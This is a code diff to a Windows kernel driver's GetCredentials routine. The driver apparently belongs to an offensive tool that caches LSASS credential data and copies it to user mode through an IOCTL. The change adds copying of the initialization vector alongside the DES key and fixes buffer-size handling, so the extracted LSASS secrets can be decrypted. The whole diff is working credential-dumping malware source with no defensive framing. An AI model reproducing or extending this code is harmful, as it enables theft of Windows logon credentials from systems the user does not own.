@@ -1011,19 +1011,33 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
 
 	if (credentials->Count != cachedLsassInfo.Count) {
 		credentials->Count = cachedLsassInfo.Count;
+		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
+		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
 		return STATUS_SUCCESS;
 	}
 	if (credentials->DesKey.Size != cachedLsassInfo.DesKey.Size) {
-		credentials->DesKey.Size = cachedLsassInfo.Count;
-		return STATUS_BUFFER_TOO_SMALL;
+		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
+		return STATUS_SUCCESS;
 	}
-	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
-	MemoryGuard credentialGuard(credentials->Creds, sizeof(Credentials) * cachedLsassInfo.Count, UserMode);
+	if (credentials->Iv.Size != cachedLsassInfo.Iv.Size) {
+		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
+		return STATUS_SUCCESS;
+	}
 
-	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid())
+	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
+	MemoryGuard ivGuard(credentials->Iv.Data, cachedLsassInfo.Iv.Size, UserMode);
+	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(Credentials) * cachedLsassInfo.Count), UserMode);
+
+	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid() || !ivGuard.IsValid())
 		return STATUS_INVALID_ADDRESS;
 	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.DesKey.Data,
 		IoGetCurrentProcess(), credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.Iv.Data,
+		IoGetCurrentProcess(), credentials->Iv.Data, cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -1057,6 +1071,7 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
 	cachedLsassInfo.Count = 0;
 	FreeVirtualMemory(cachedLsassInfo.Creds);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
+	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
 	return status;
 }
 
